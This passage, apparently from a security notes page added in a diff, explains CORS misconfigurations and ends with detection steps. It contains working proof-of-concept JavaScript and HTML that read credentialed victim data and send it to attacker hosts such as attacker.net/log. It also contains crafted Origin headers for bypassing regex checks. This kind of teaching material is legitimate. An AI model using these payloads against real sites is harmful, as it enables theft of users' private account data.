+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> [<span style="color:#a6e22e">evil</span>.<span style="color:#a6e22e">com</span>](<span style="color:#a6e22e">http</span><span style="color:#f92672">:</span><span style="color:#75715e">//evil.com) **OR** Allow-Access-Allow-Origin: null
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Credential</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
+</span></span></code></pre></div><p>In response, if the Allow-Access-Allow-Credential is set to true then the browser will transmit the credentials (cookies, Authorization headers, TLS client certificates).</p>
+<h2 id="exploiting-cors-misconfigurations">
+  Exploiting CORS Misconfigurations
+  <a class="anchor" href="#exploiting-cors-misconfigurations">#</a>
+</h2>
+<h3 id="origin-reflection">
+  Origin Reflection:
+  <a class="anchor" href="#origin-reflection">#</a>
+</h3>
+<p>In this case, the request and response  will be like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">sensitive</span><span style="color:#f92672">-</span><span style="color:#a6e22e">victim</span><span style="color:#f92672">-</span><span style="color:#a6e22e">data</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">vulnerable</span><span style="color:#f92672">-</span><span style="color:#a6e22e">website</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//malicious-website.com
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">sessionid</span><span style="color:#f92672">=</span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//malicious-website.com
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Credentials</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p><strong>Proof of Concept</strong></p>
+<p>To exploit this vulnerability, this JS script need to be hosted in malicious-website.com</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">req</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">reqListener</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;get&#39;</span>,<span style="color:#e6db74">&#39;https://vulnerable-website.com/sensitive-victim-data&#39;</span>,<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">withCredentials</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">send</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">reqListener</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;//malicious-website.com/log?key=&#39;</span><span style="color:#f92672">+</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">responseText</span>;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>OR</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>     &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>         &lt;<span style="color:#f92672">h2</span>&gt;<span style="color:#a6e22e">CORS</span> <span style="color:#a6e22e">PoC</span>&lt;/<span style="color:#f92672">h2</span>&gt;
+</span></span><span style="display:flex;"><span>         &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;demo&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>             &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;button&#34;</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cors()&#34;</span>&gt;<span style="color:#a6e22e">Exploit</span>&lt;/<span style="color:#f92672">button</span>&gt;
+</span></span><span style="display:flex;"><span>         &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>         &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>             <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">cors</span>() {
+</span></span><span style="display:flex;"><span>             <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xhr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+</span></span><span style="display:flex;"><span>             <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span>                 <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>) {
+</span></span><span style="display:flex;"><span>                 document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;demo&#34;</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">alert</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">responseText</span>);
+</span></span><span style="display:flex;"><span>                 }
+</span></span><span style="display:flex;"><span>             };
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>,
+</span></span><span style="display:flex;"><span>                       <span style="color:#e6db74">&#34;https://victim.example.com/endpoint&#34;</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>             <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">withCredentials</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>             <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">send</span>();
+</span></span><span style="display:flex;"><span>             }
+</span></span><span style="display:flex;"><span>         &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>     &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><h3 id="whitelisted-null-origin">
+  Whitelisted null origin
+  <a class="anchor" href="#whitelisted-null-origin">#</a>
+</h3>
+<p>In this case, the request and response body will be:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">endpoint</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">victim</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">sessionid</span><span style="color:#f92672">=</span>... 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Credentials</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>......
+</span></span></code></pre></div><p><strong>Proof of Concept</strong></p>
+<p>This vulnerability can be exploit by putting the code in to iframe using the data URI schema.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">sandbox</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;allow-scripts allow-top-navigation allow-forms&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data:text/html, &lt;script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  var req = new XMLHttpRequest();
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  req.onload = reqListener;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  req.open(&#39;get&#39;,&#39;https://victim.example.com/endpoint&#39;,true);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  req.withCredentials = true;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  req.send();
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  function reqListener() {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    location=&#39;https://attacker.example.net/log?key=&#39;+encodeURIComponent(this.responseText);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   };
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/script&gt;&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt; 
+</span></span></code></pre></div><h3 id="xss-on-trusted-origin">
+  XSS on Trusted Origin
+  <a class="anchor" href="#xss-on-trusted-origin">#</a>
+</h3>
+<p>If the application is using strong whitelisting property then the above POC will not work. But if the application trust one origin which is vulnerable to XSS than you can inject the above code in XSS attack to exploit CORS.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//subdomain.vulnerable-website.com/?xss=&lt;script&gt;cors-stuff-here&lt;/script&gt;
+</span></span></span></code></pre></div><h3 id="wildcard-origin-without-credentials">
+  Wildcard Origin without credentials
+  <a class="anchor" href="#wildcard-origin-without-credentials">#</a>
+</h3>
+<p>If the server responds with a wildcard origin <code>*</code>, the browser does never send the cookies. However, if the server does not require authentication, it&rsquo;s still possible to access the data on the server. This can happen on internal servers that are not accessible from the Internet.</p>
+<p>In this case, the request and response body will be</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">endpoint</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">api</span>.<span style="color:#a6e22e">internal</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//evil.com
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#f92672">*</span>
+</span></span></code></pre></div><p><strong>Proof of Concept</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">req</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>(); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">reqListener</span>; 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;get&#39;</span>,<span style="color:#e6db74">&#39;https://api.internal.example.com/endpoint&#39;</span>,<span style="color:#66d9ef">true</span>); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">send</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">reqListener</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;//attacker.net/log?key=&#39;</span><span style="color:#f92672">+</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">responseText</span>; 
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><h3 id="weak-regular-expression-bypass">
+  Weak Regular Expression Bypass
+  <a class="anchor" href="#weak-regular-expression-bypass">#</a>
+</h3>
+<p>Sometimes regular expression to validate the origin only check the suffix or the prefix of the origin. And this weak implementation to validate the origin can lead to CORS misconfiguration.</p>
+<p><strong>Example 1</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">endpoint</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">api</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//evilexample.com
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//evilexample.com
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Credentials</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> 
+</span></span></code></pre></div><p><strong>Example 2</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">endpoint</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">api</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//apiiexample.com
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//apiiexample.com
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Credentials</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> 
+</span></span></code></pre></div><p><strong>Proof of Concept</strong></p>
+<p>This POC need to be hosted in the required domain name according to the regex misconfiguration</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">req</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>(); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">reqListener</span>; 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;get&#39;</span>,<span style="color:#e6db74">&#39;https://api.example.com/endpoint&#39;</span>,<span style="color:#66d9ef">true</span>); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">withCredentials</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">send</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">reqListener</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;//attacker.net/log?key=&#39;</span><span style="color:#f92672">+</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">responseText</span>; 
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><h3 id="advance-regular-expression-bypass">
+  Advance Regular Expression Bypass
+  <a class="anchor" href="#advance-regular-expression-bypass">#</a>
+</h3>
+<p>Regex patterns typically concentrate on alphanumeric, dot (.), and hyphen (-) characters, neglecting other possibilities. So in some cases if some special characters are included i the domain name it will effect the validation process by the browser and even bypass the domain name validation.</p>
+<p><strong>Example 1 (chrome and Firefox)</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> <span style="color:#f92672">/</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> &lt;<span style="color:#f92672">session_cookie</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.application_.arbitrary.com
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">2</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.application_.arbitrary.com
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Credentials</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
+</span></span></code></pre></div><p><strong>Example 2 (Safari)</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> <span style="color:#f92672">/</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> &lt;<span style="color:#f92672">session_cookie</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.application}.arbitrary.com
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">2</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> &lt;<span style="color:#f92672">session_cookie</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.application}.arbitrary.com
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Credentials</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
+</span></span></code></pre></div><p>
+  <img src="../cors.png" alt="image.png" /></p>
+<h3 id="xssijsonp-bypass">
+  XSSI/JSONP Bypass
+  <a class="anchor" href="#xssijsonp-bypass">#</a>
+</h3>
+<p><code>&lt;script src=...&gt;</code> ignores SOP. So browsers send cookies for script requests. And JSONP endpoints return JS, not JSON which will bypass CORS.</p>
+<p><strong>Proof of Concept</strong></p>
+<p>First add a <strong><code>callback</code></strong> <strong>parameter</strong> in the request. Maybe the page was prepared to send the data as JSONP. In that case, the page will send back the data with <code>Content-Type: application/javascript</code> which will bypass the CORS policy.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//example.com/data?callback=testjsonp
+</span></span></span></code></pre></div><h3 id="iframe--popup-bypass">
+  Iframe + Popup Bypass
+  <a class="anchor" href="#iframe--popup-bypass">#</a>
+</h3>
+<p>Sometimes the backend validate the origin via</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">origin</span> <span style="color:#f92672">===</span> window.<span style="color:#a6e22e">origin</span>)
+</span></span></code></pre></div><p>In that case, use iframe + <code>window.open()</code> to bypass origin checks.</p>
+<h2 id="detection">
+  <strong>Detection</strong>
+  <a class="anchor" href="#detection">#</a>
+</h2>
+<ul>
+<li>
+<p><strong>Step 1: Identify sensitive endpoints</strong></p>
+<pre tabindex="0"><code>/api/user/profile
+/api/account/details
+/api/orders
+</code></pre><p>→ Focus on APIs returning private/authenticated data</p>
+</li>
+<li>
+<p><strong>Step 2: Send request with custom Origin</strong></p>
+<pre tabindex="0"><code>Origin: https://evil.com
+</code></pre><p>→ Check response headers</p>
+</li>
+<li>
+<p><strong>Step 3: Check for reflected Origin</strong></p>
+<pre tabindex="0"><code>Access-Control-Allow-Origin: https://evil.com
+</code></pre><p>→ Indicates dynamic origin handling</p>
+</li>
+<li>
+<p><strong>Step 4: Check credentials support</strong></p>
+<pre tabindex="0"><code>Access-Control-Allow-Credentials: true
+</code></pre><p>→ Critical if used with reflected or weak origin validation</p>
+</li>
+<li>
+<p><strong>Step 5: Test wildcard misconfiguration</strong></p>
+<pre tabindex="0"><code>Access-Control-Allow-Origin: *
+</code></pre><p>→ High risk if endpoint returns sensitive data</p>
+</li>
+<li>
+<p><strong>Step 6: Try null Origin bypass</strong></p>
+<pre tabindex="0"><code>Origin: null
+</code></pre><p>→ Check if server still allows access</p>
+</li>
+<li>
+<p><strong>Step 7: Validate preflight behavior</strong></p>
+<pre tabindex="0"><code>OPTIONS /api/data
+Origin: https://evil.com
+Access-Control-Request-Method: POST
+</code></pre><p>→ Look for overly permissive response:</p>
+<pre tabindex="0"><code>Access-Control-Allow-Methods: *
+Access-Control-Allow-Origin: *
+</code></pre></li>
+<li>
+<p><strong>Step 8: Compare response behavior</strong></p>
+<ul>
+<li>With <code>Origin</code> header → allowed/blocked?</li>
+<li>Without <code>Origin</code> header → any difference?</li>
+</ul>
